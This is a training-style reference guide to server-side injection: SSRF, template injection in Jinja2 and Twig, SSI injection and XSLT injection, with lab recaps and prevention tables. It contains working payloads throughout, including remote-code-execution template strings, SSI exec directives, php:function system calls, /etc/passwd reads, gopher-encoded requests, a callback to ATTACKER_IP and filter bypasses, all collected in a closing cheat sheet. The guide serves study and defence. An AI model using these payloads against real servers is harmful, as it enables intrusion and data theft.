# Server-Side Attacks: Reference Guide

A practical reference for four server-side injection classes: Server-Side Request Forgery (SSRF), Server-Side Template Injection (SSTI), Server-Side Includes (SSI) injection, and XSLT server-side injection. It covers identification, exploitation, prevention, tooling, and lab walkthroughs.

---

## Table of Contents

1. [Introduction to Server-Side Attacks](#1-introduction-to-server-side-attacks)
2. [Server-Side Request Forgery (SSRF)](#2-server-side-request-forgery-ssrf)
3. [Server-Side Template Injection (SSTI)](#3-server-side-template-injection-ssti)
4. [Server-Side Includes (SSI) Injection](#4-server-side-includes-ssi-injection)
5. [XSLT Server-Side Injection](#5-xslt-server-side-injection)
6. [Tools](#6-tools)
7. [Quick Reference Tables](#7-quick-reference-tables)
8. [Universal Mental Model](#8-universal-mental-model)
9. [Lab Walkthrough Recap](#9-lab-walkthrough-recap)
10. [Payload Cheat Sheet](#10-payload-cheat-sheet)

---

## 1. Introduction to Server-Side Attacks

### 1.1 Client-side vs. server-side

| Type | Where it runs | Example |
|---|---|---|
| Client-side | User's browser | Cross-site scripting (XSS) |
| Server-side | Web server | SSRF, SSTI, SSI, XSLT injection |

Client-side attacks target users. Server-side attacks target the server itself and often lead to data leakage, internal network access, or full remote code execution (RCE).

### 1.2 The four classes

1. **SSRF**: Server-Side Request Forgery
2. **SSTI**: Server-Side Template Injection
3. **SSI injection**: Server-Side Includes injection
4. **XSLT injection**: XSL Transformations injection

**Common root cause:** the server trusts user input and either uses it to make requests or executes it as code.

---

## 2. Server-Side Request Forgery (SSRF)

### 2.1 What it is

SSRF occurs when a web application fetches a remote resource based on a user-supplied URL. The attacker can make the server request arbitrary destinations: internal systems, cloud metadata endpoints, or attacker-controlled hosts. SSRF is part of the OWASP Top 10.

### 2.2 URL schemes abused

| Scheme | Purpose | Attacker use |
|---|---|---|
| `http://`, `https://` | Fetch over HTTP(S) | Reach internal web apps, bypass some filters |
| `file://` | Read local files | Local file inclusion: `/etc/passwd`, configs, source |
| `gopher://` | Send raw bytes to any TCP socket | Craft POST requests, talk to SMTP, MySQL, Redis |
| `dict://` | Dictionary protocol | Service enumeration and low-level probing |

### 2.3 Types

| Type | Description | Exploitation power |
|---|---|---|
| Non-blind | Response reflected to the attacker | Full: file reads, port scans, gopher |
| Blind | Response not reflected | Limited: inference from error messages only |

### 2.4 Identifying SSRF

**Step 1. Find a URL-accepting parameter.** Look for names such as `url`, `api`, `dateserver`, `image`, `feed`, `track`, or `fetch`.

**Step 2. Confirm with a callback.** On your machine:

```bash
nc -lnvp 8000
```

Send the request to the target:

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

api=http://<ATTACKER_IP>:8000/test
```

If netcat receives `GET /test HTTP/1.1`, the server fetched your URL and SSRF is confirmed.

**Step 3. Check whether it is non-blind.**

```http
api=http://127.0.0.1/
```

If the internal HTML appears in the response, it is non-blind.

### 2.5 Exploiting non-blind SSRF

**Internal port scanning.** Find the error message for a closed port:

```http
api=http://127.0.0.1:12345/
# "Failed to connect..." or "Something went wrong!"
```

Scan with ffuf and filter out that message:

```bash
seq 1 10000 > ports.txt

ffuf -w ./ports.txt \
  -u http://TARGET/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://127.0.0.1:FUZZ/&date=2000-01-01" \
  -fr "Failed to connect"
```

Responses that survive the filter indicate open ports.

**Internal host directory brute force:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u http://TARGET/ \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "api=http://internal.htb/FUZZ.php" \
  -fr "Server at internal.htb Port 80"
```

**Local file inclusion** (if `file://` is allowed):

```http
api=file:///etc/passwd
api=file:///flag.txt
api=file:///var/www/html/index.php
```

**POST requests via gopher.** If `http://` only allows GET, craft the raw request, URL-encode it, and prefix it with `gopher://host:port/_`. Double-encode the whole URL, because it sits inside the outer request body:

```text
gopher://target:80/_POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20target%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

### 2.6 Exploiting blind SSRF

Blind SSRF gives you only differences in messages:

| Server state | Response |
|---|---|
| Port closed | "Something went wrong!" (or similar) |
| Port open and speaks HTTP | "Date is unavailable" (or similar) |

Still possible:
- Port scanning, via message differences
- File existence checks, via `file://` message differences
- Blind payload delivery, where you confirm success through side effects elsewhere

**Limitation:** services that do not speak HTTP, such as MySQL or Redis, may return the "closed" message even when open, so this technique cannot see them.

### 2.7 SSRF prevention

| Layer | Control |
|---|---|
| Application | Whitelist allowed origins and URLs |
| Application | Restrict the URL scheme (for example, HTTPS only) |
| Application | Validate and sanitize all URL input |
| Network | Egress firewall rules that drop unexpected outbound traffic |
| Network | Segment internal networks from web servers |

Never let user input freely control where the server fetches from. Combine application-layer and network-layer defenses.

---

## 3. Server-Side Template Injection (SSTI)

### 3.1 What it is

Template engines combine templates (code) with values (data) to generate dynamic output. SSTI occurs when user input becomes part of the template instead of a value, so the engine executes it.

This is the same code/data confusion behind SQL injection, SSRF, and SSI.

### 3.2 Template basics

Jinja2 and Twig use two main delimiters:

| Syntax | Purpose |
|---|---|
| `{{ ... }}` | Output a value |
| `{% ... %}` | Execute logic such as loops or conditionals |

Safe usage passes user input as a value:

```python
render_template("Hello {{ name }}!", name=user_input)
```

Vulnerable usage concatenates user input into the template:

```python
render_template("Hello " + user_input + "!")
```

### 3.3 Three ways SSTI happens

1. User input is concatenated into the template before rendering.
2. Double rendering: user input is inserted into the output of a first render, and a second render then executes it.
3. Users can edit or submit templates directly.

### 3.4 Identifying SSTI

**Step 1. Break the syntax.** Send a string full of template metacharacters:

```text
${{<%[%'"}}%\
```

A server error suggests the input reached a template context.

**Step 2. Confirm evaluation.** Math payloads reveal the delimiter in use:

```text
{{7*7}}       -> 49    (uses {{ }})
${7*7}        -> 49    (uses ${ })
<%= 7*7 %>    -> 49    (ERB)
#{7*7}        -> 49    (Ruby or Jade)
```

**Step 3. Identify the engine.** String multiplication behaves differently by engine:

```text
{{7*'7'}}     -> 7777777   Jinja2 (Python string repeat)
{{7*'7'}}     -> 49        Twig (PHP numeric coercion)
```

### 3.5 Exploiting Jinja2 (Python)

Information disclosure:

```jinja
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```

File read:

```jinja
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Remote code execution:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{lipsum.__globals__["os"].popen('cat /flag.txt').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 3.6 Exploiting Twig (PHP)

Information disclosure (limited):

```twig
{{ _self }}
```

File read (Symfony only):

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

Remote code execution:

```twig
{{ ['id'] | filter('system') }}
{{ ['cat /flag.txt'] | filter('system') }}
```

When spaces are filtered, substitute `${IFS}`:

```twig
{{ ['cat${IFS}/flag.txt'] | filter('system') }}
```

Alternative execution functions:

```twig
{{ ['cat /flag.txt'] | filter('passthru') }}
{{ ['cat /flag.txt'] | filter('shell_exec') }}
{{ ['cat /flag.txt'] | map('system') | join }}
```

### 3.7 SSTI prevention

The main rule: user input must never be passed as the template itself. Pass it only as a value.

If users must edit or upload templates:

| Defense | Strength | Notes |
|---|---|---|
| Remove dangerous functions | Weak | Prone to bypasses |
| Isolate the engine in a container | Strong | Recommended. Limits the blast radius |

---

## 4. Server-Side Includes (SSI) Injection

### 4.1 What it is

SSI lets a web server inject dynamic content into HTML pages through directives embedded in HTML comments. SSI injection occurs when an attacker can place SSI directives into a file the server later parses.

Common extensions are `.shtml`, `.shtm`, and `.stm`, but servers can enable SSI on any extension.

### 4.2 Directive syntax

```html
<!--#name param1="value1" param2="value2" -->
```

### 4.3 Common directives

| Directive | Purpose | Example |
|---|---|---|
| `printenv` | Dump environment variables | `<!--#printenv -->` |
| `config` | Change SSI configuration | `<!--#config errmsg="Error!" -->` |
| `echo` | Print a variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
| `exec` | Run a shell command | `<!--#exec cmd="whoami" -->` |
| `include` | Include another file (web root only) | `<!--#include virtual="index.html" -->` |

### 4.4 How injection happens

- A file upload lets the attacker place a file with SSI directives in the web root.
- The application writes user input to a file in the web root, and that input lands in a file the server parses.

### 4.5 Exploitation

Confirm SSI execution with a read-only directive:

```html
<!--#printenv -->
```

If environment variables appear on the page, SSI is active.

Prove command execution:

```html
<!--#exec cmd="id" -->
```

Output such as `uid=33(www-data)` confirms remote code execution.

Read the flag:

```html
<!--#exec cmd="cat /flag.txt" -->
```

If the path is unknown:

```html
<!--#exec cmd="find / -name '*flag*' -type f 2>/dev/null" -->
```

If spaces are stripped:

```html
<!--#exec cmd="cat${IFS}/flag.txt" -->
```

### 4.6 SSI prevention

| Layer | Control |
|---|---|
| Application | Validate and sanitize all user input |
| Application | Never write user input into SSI-parsed files |
| Server | Restrict SSI to specific file extensions |
| Server | Restrict SSI to specific directories |
| Server | Disable exec. In Apache, use `Options IncludesNOEXEC` |

The best single defense is `IncludesNOEXEC`, which keeps SSI available but blocks the command execution primitive.

---

## 5. XSLT Server-Side Injection

### 5.1 What it is

XSLT (eXtensible Stylesheet Language Transformations) converts XML into other formats such as HTML or plain text. XSLT injection occurs when user input is inserted into the stylesheet before the XSLT processor runs.

### 5.2 Core XSL elements

| Element | Purpose |
|---|---|
| `<xsl:template match="...">` | Applies a template to an XML path |
| `<xsl:value-of select="...">` | Extracts a node's value |
| `<xsl:for-each select="...">` | Loops over matching nodes |
| `<xsl:sort select="..." order="...">` | Sorts nodes within a loop |
| `<xsl:if test="...">` | Conditional filter |

### 5.3 Example transformation

Input XML:

```xml
<fruits>
  <fruit><name>Apple</name><color>Red</color></fruit>
  <fruit><name>Banana</name><color>Yellow</color></fruit>
</fruits>
```

Stylesheet:

```xml
<xsl:template match="/fruits">
  Here are all the fruits:
  <xsl:for-each select="fruit">
    <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
  </xsl:for-each>
</xsl:template>
```

Output:

```text
Here are all the fruits:
  Apple (Red)
  Banana (Yellow)
```

### 5.4 Identifying XSLT injection

**Step 1. Break the markup.** Submit a lone `<`. A 500 Internal Server Error is a strong signal.

**Step 2. Fingerprint the processor:**

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor:  <xsl:value-of select="system-property('xsl:vendor')" />
Product: <xsl:value-of select="system-property('xsl:product-name')" />
```

| Finding | Why it matters |
|---|---|
| Version 1.0 | `unparsed-text` will not work |
| Version 2.0 | `unparsed-text` file read is available |
| Vendor is libxslt | Check whether PHP functions are enabled |

### 5.5 Exploiting XSLT injection

**File read, option A (XSLT 2.0 only):**

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

**File read, option B (PHP functions enabled):**

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

**Command execution:**

```xml
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

If the path is unknown, enumerate first:

```xml
<xsl:value-of select="php:function('system','ls -la /')" />
```

### 5.6 XSLT prevention

| Layer | Control |
|---|---|
| Application | Never build XSLT from user input |
| Application | Encode user values for XML (`<` becomes `&lt;`, `>` becomes `&gt;`) |
| Application | Validate input format |
| Runtime | Run the XSLT processor as a low-privilege user |
| Runtime | Disable `php:function()`, which removes the command execution primitive |
| Maintenance | Keep libxslt patched |

Encoding `<` blocks most injection, because `<` is the gateway into the stylesheet.

---

## 6. Tools

### 6.1 SSTImap (SSTI automation)

SSTImap is a maintained replacement for the deprecated tplmap, which targeted Python 2.

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
```

Detect SSTI automatically:

```bash
python3 sstimap.py -u "http://TARGET/index.php?name=test"
```

Example output:

```text
Query parameter: name
Engine: Twig
OS: Linux
Capabilities:
  Shell command execution: ok
  File read: ok
  File write: ok
  Code evaluation: ok, php code
```

Common options:

```bash
python3 sstimap.py -u <URL> -D '/etc/passwd' './passwd'   # download a file
python3 sstimap.py -u <URL> -S id                         # run a command
python3 sstimap.py -u <URL> --os-shell                    # interactive OS shell
```

### 6.2 Gopherus (gopher payload generator)

Gopherus generates gopher URLs for services such as SMTP, MySQL, Redis, and FastCGI:

```bash
python2.7 gopherus.py --exploit smtp
```

Supported services include MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, and several memcache clients.

### 6.3 Other useful tools

| Tool | Purpose |
|---|---|
| ffuf | Directory and port fuzzing, including through SSRF |
| Burp Suite | Request crafting, with Repeater for iterative testing |
| curl | Quick request testing from the terminal |
| SecLists | Discovery wordlists under `/usr/share/seclists/` |

---

## 7. Quick Reference Tables

### 7.1 Vulnerability-to-payload map

| Class | Confirm | File read | RCE |
|---|---|---|---|
| SSRF | `api=http://ATTACKER:8000/` | `api=file:///etc/passwd` | `gopher://` or an internal service |
| SSTI (Twig) | `{{7*7}}` returns 49 | `"/etc/passwd"\|file_excerpt(1,-1)` | `{{['id']\|filter('system')}}` |
| SSTI (Jinja2) | `{{7*7}}` returns 49 | `.open("/etc/passwd").read()` | `lipsum.__globals__["os"].popen('id').read()` |
| SSI | `<!--#printenv -->` | `<!--#include virtual="..." -->` | `<!--#exec cmd="id" -->` |
| XSLT | `<` returns 500 | `php:function('file_get_contents','/etc/passwd')` | `php:function('system','id')` |

### 7.2 Engine identification

| Payload | Result | Engine |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2 or Twig |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `{{7*'7'}}` | 49 | Twig |
| `${7*7}` | 49 | Freemarker, Thymeleaf, and others |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{7*7}` | 49 | Ruby or Jade |

### 7.3 Flag location

| Command | Where to look |
|---|---|
| `cat /flag.txt` | Root directory (most common) |
| `cat /root/flag.txt` | Root user's home |
| `cat /var/www/html/flag.txt` | Web root |
| `find / -name '*flag*' 2>/dev/null` | Locate first, then read |
| `ls -la /` | List the root directory |

### 7.4 Space bypass

| Context | Substitute |
|---|---|
| Shell command in SSTI, SSI, or XSLT | `${IFS}` |
| URL path or parameter | `%20` |
| Shell (alternatives) | `$IFS`, `<`, `$'\x20'` |

### 7.5 Blind vs. non-blind

| Aspect | Non-blind | Blind |
|---|---|---|
| Response visible | Yes | No |
| File read | Yes | No |
| Directory brute force | Yes | No |
| Port scan | Full | Message differences only |
| File existence | Yes | Message differences only |
| RCE | Yes | Blind; check side effects |

### 7.6 Prevention summary

| Class | Application-layer fix | Network or runtime fix |
|---|---|---|
| SSRF | Whitelist URLs; restrict scheme | Egress firewall; segmentation |
| SSTI | Pass values only, never the template | Sandbox or container |
| SSI | Sanitize; keep input out of files | `IncludesNOEXEC`; restrict extension and directory |
| XSLT | Encode `<` and `>`; use static XSLT | Disable `php:function`; low-privilege user |

---

## 8. Universal Mental Model

Every server-side injection in this guide follows the same pattern. The developer mixes user input with code, the engine executes what it sees as code, and the attacker controls that code.

### Exploitation flow

1. **Identify** the injection point: a URL, field, header, XML body, and so on.
2. **Confirm** the vulnerability: break the syntax to cause an error, or send a math payload that gets evaluated.
3. **Identify capabilities:** which engine, library, or version is in use.
4. **Exploit step by step:** information disclosure, then file read, then RCE.
5. **Read the flag:** `cat /flag.txt`, or find it first.

### Defense rule

User input must always be treated as data, never as code. When that cannot be guaranteed, isolate the execution environment with a container or sandbox, so that even successful exploitation has a limited blast radius.

---

## 9. Lab Walkthrough Recap

**Lab 1: SSRF identification.** The `dateserver` parameter fetched a user-supplied URL. A netcat callback confirmed the request, and a request to `127.0.0.1` confirmed it was non-blind. A port scan with ffuf found an internal application and a MySQL port. The internal application's HTML contained the flag.

**Lab 2: SSRF exploitation.** The same pattern with an internal hostname. Directory brute force through SSRF found an admin page. A gopher-encoded POST with the admin password reached the dashboard, which displayed the flag.

**Lab 3: Blind SSRF.** The response was not reflected. Different error messages for open and closed ports allowed an ffuf scan filtered on the closed-port message, which revealed an additional open port.

**Lab 4: SSTI (Jinja2).** The `name` parameter was reflected into a Jinja template. `{{7*7}}` returned 49 and `{{7*'7'}}` returned 7777777, identifying Jinja2. The `lipsum` payload executed `id` and then read the flag.

**Lab 5: SSTI (Twig).** `{{7*'7'}}` returned 49, identifying Twig. `filter('system')` ran `id` as `www-data`, and then read the flag.

**Lab 6: SSI injection.** The `msg` parameter was reflected into a `.shtml` page. `<!--#printenv -->` confirmed SSI, `<!--#exec cmd="id" -->` confirmed execution, and reading the flag through a directive finished the lab.

**Lab 7: XSLT injection.** A lone `<` caused a 500 error. `system-property('xsl:vendor')` identified libxslt, and `php:function('system', ...)` ran commands as `www-data`, with privilege escalation via `find` where needed.

**Skills assessment (Flavor Fusion Express).** The `api` parameter in a POST body fetched a user-supplied URL, which reached an internal truck API. The `id` parameter on that API was injectable with `{{7*7}}` returning 49, identifying Twig. `file://` was blocked by a curl protocol restriction, so the path went through SSTI instead: `filter('system')` with `${IFS}` in place of spaces read the flag.

---

## 10. Payload Cheat Sheet

```text
SSRF CONFIRM:       api=http://ATTACKER_IP:8000/ssrf
SSRF LFI:           api=file:///etc/passwd
SSRF PORT SCAN:     ffuf -w ports.txt -u TARGET -d "api=http://127.0.0.1:FUZZ/" -fr "closed-msg"
SSRF GOPHER POST:   gopher://host:80/_POST%20/path%20HTTP/1.1%0D%0A...

SSTI DETECT:        {{7*7}}                 -> 49
SSTI TWIG CHECK:    {{7*'7'}}               -> 49
SSTI JINJA CHECK:   {{7*'7'}}               -> 7777777
SSTI TWIG RCE:      {{['id']|filter('system')}}
SSTI TWIG FLAG:     {{['cat${IFS}/flag.txt']|filter('system')}}
SSTI JINJA RCE:     {{lipsum.__globals__["os"].popen('id').read()}}
SSTI JINJA FLAG:    {{lipsum.__globals__["os"].popen('cat /flag.txt').read()}}

SSI CONFIRM:        <!--#printenv -->
SSI RCE:            <!--#exec cmd="id" -->
SSI FLAG:           <!--#exec cmd="cat /flag.txt" -->

XSLT CONFIRM:       <                       -> 500 error
XSLT FINGERPRINT:   <xsl:value-of select="system-property('xsl:vendor')" />
XSLT FILE READ:     <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
XSLT RCE:           <xsl:value-of select="php:function('system','id')" />
XSLT FLAG:          <xsl:value-of select="php:function('system','cat /flag.txt')" />
```

---

**Final takeaway.** Server-side attacks are code/data confusion. Whether the user input is a URL (SSRF), a template placeholder (SSTI), an HTML comment (SSI), or a stylesheet (XSLT), the attacker wins once that input is executed rather than treated as data.
